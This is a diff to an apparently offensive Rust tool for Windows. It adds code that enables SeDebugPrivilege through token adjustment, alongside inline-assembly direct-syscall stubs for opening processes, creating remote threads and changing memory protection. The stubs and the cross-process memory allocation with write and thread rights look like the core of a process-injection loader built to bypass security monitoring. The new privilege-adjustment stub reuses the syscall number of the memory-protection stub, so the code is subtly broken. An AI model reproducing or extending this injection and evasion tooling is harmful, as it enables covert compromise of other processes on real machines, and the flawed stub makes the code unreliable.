@@ -3,14 +3,15 @@
 use std::{ops::Deref, os::raw::c_void, path::PathBuf};
 use core::arch::global_asm;
 use std::ptr::null_mut;
-use windows::{core::PWSTR, Wdk::Foundation::OBJECT_ATTRIBUTES, Win32::{
-        Foundation::{CloseHandle, HANDLE, HWND, NTSTATUS},
-        System::{
-            ProcessStatus::EnumProcesses, 
-            Threading::{QueryFullProcessImageNameW, PROCESS_ACCESS_RIGHTS, PROCESS_NAME_FORMAT, THREAD_ACCESS_RIGHTS, THREAD_ALL_ACCESS}, 
-                WindowsProgramming::CLIENT_ID
-        },
-    }
+use windows::{  core::PWSTR, 
+                Wdk::Foundation::OBJECT_ATTRIBUTES, 
+                Win32::{
+                    Foundation::{CloseHandle, HANDLE, HWND, LUID, NTSTATUS}, 
+                    Security::{AdjustTokenPrivileges, LookupPrivilegeValueW, LUID_AND_ATTRIBUTES, SE_DEBUG_NAME, TOKEN_ALL_ACCESS, TOKEN_PRIVILEGES, TOKEN_PRIVILEGES_ATTRIBUTES}, 
+                    System::{ ProcessStatus::EnumProcesses, 
+                        Threading::{OpenProcessToken, QueryFullProcessImageNameW, PROCESS_ACCESS_RIGHTS, PROCESS_NAME_FORMAT, THREAD_ACCESS_RIGHTS, THREAD_ALL_ACCESS}, 
+                                    WindowsProgramming::CLIENT_ID}
+                }
 };
 
 // Utility function
@@ -45,9 +46,9 @@ impl WindowsProcess {
 
     fn check_handle(&mut self) -> Result<(), NTSTATUS> { 
         if self.handle.is_none() { 
-            eprintln!("An open handle is required!");
+            eprintln!("[!] A handle is required!");
             self.get_handle()?;
-            eprintln!("Acquired a handle.")
+            eprintln!("[+] Acquired a handle.")
         }
         Ok(())
     }
@@ -182,10 +183,16 @@ nt_open_process:
     ret
 nt_create_thread_ex:
     mov r10, rcx
-    mov eax, 0x0C2
+    mov eax, 0xc2
     syscall
     ret
 zw_protect_virtual_memory:
+    mov r10, rcx
+    mov eax, 0x50
+    syscall
+    ret
+
+nt_adjust_privileges_token:
     mov r10, rcx
     mov eax, 0x50
     syscall
@@ -247,6 +254,16 @@ extern "C" {
         proc_flag: usize,                   // [in] New protection flags.               [ULONG]
         flag_old: *mut usize                // [out] Returns old protection flags       [PULONG]
     ) -> NTSTATUS;
+
+    fn nt_adjust_privileges_token(
+        token_handle: HANDLE,               // [in]                                     [HANDLE]
+        disable_all: bool,                  // [in]                                     [BOOLEAN]
+        priveleges: *const TOKEN_PRIVILEGES,// [in, opt]                                [PTOKEN_PRIVILEGES]
+        buffer_len: usize,                  // [in]                                     [ULONG] 
+        previous_state: CCvoid,             // [out]                                    [PTOKEN_PRIVILEGES]
+        return_length: CCvoid,              // [out, opt]                               [PULONG]
+    ) -> NTSTATUS;
+
 }
 
 // --- Rusty wrapper functions ---
@@ -287,10 +304,62 @@ pub fn get_process_name(handle: &HANDLE) -> Result<PathBuf, windows::core::Error
     Ok(PathBuf::from(String::from_utf16_lossy(&return_buffer)))
 }
 
+pub fn get_token_handle(handle: HANDLE) -> Result<HANDLE, windows::core::Error> { 
+    let mut token_handle = HANDLE::default();
+    let mut token_handle_ptr = &mut token_handle as *mut HANDLE;
+    unsafe {
+        OpenProcessToken(
+            handle,
+            TOKEN_ALL_ACCESS,
+            token_handle_ptr
+        )?;
+        Ok(token_handle)
+    }
+}
+
+fn get_luid() -> Result<LUID, windows::core::Error> {
+    let mut luid_content = LUID::default();
+    let mut luid_ptr = &mut luid_content as *mut LUID;
+    unsafe { 
+        LookupPrivilegeValueW(
+            None,
+            SE_DEBUG_NAME,
+            luid_ptr
+        )?;
+        Ok(luid_content)
+    }
+}
+
+pub fn adjust_token_privileges(token_handle: HANDLE) -> Result<(), windows::core::Error> {
+    let luid = get_luid()?;
+    let token_privs: TOKEN_PRIVILEGES = TOKEN_PRIVILEGES{
+        PrivilegeCount:1,
+        Privileges: [LUID_AND_ATTRIBUTES {
+            Luid: luid,
+            Attributes: TOKEN_PRIVILEGES_ATTRIBUTES(0x00000002),
+        }; 1]
+    };
+    let ptr = &token_privs as *const _ as *const TOKEN_PRIVILEGES;
+    
+    unsafe { 
+        let status= AdjustTokenPrivileges(
+            token_handle,
+            false,
+            Some(ptr),
+            std::mem::size_of::<TOKEN_PRIVILEGES>().try_into().unwrap(),
+            None,
+            None,
+        );
+        dbg!(status);
+        Ok(())
+    }
+    
+}
+
 pub fn nt_get_handle(pid: usize) -> Result<SafeHandle, NTSTATUS> {
     let mut handle = HANDLE::default();
     let mut handle_ptr = &mut handle as *mut HANDLE;
-    let desired_access = PROCESS_ACCESS_RIGHTS(0xFFFF); //0x0010 | 0x0020 | 0x0008 | 0x0400 <- Correct flags, at the moment, we are using debug flags.
+    let desired_access = PROCESS_ACCESS_RIGHTS(0x0010 | 0x0020 | 0x0008 | 0x0400 | 0x0002 | 0x1000);//0xFFFF); //0x0010 | 0x0020 | 0x0008 | 0x0400 <- Correct flags, at the moment, we are using debug flags.
     let oa = OBJECT_ATTRIBUTES::default();
     let client_id: CLIENT_ID = CLIENT_ID{
         UniqueProcess: HANDLE::from(HWND(pid as isize)),
@@ -363,7 +432,7 @@ pub fn nt_virtual_alloc(handle: HANDLE, address: Option<usize>, protection_flags
     };
     let allocation_type:    usize = match allocation_type { 
         Some(value)     => value,
-        None                   => 0x00001000,
+        None                   => 0x00001000 | 0x00002000,
     }; 
     let protection_flags:   usize = match protection_flags{ 
         Some(flags)     => flags,    
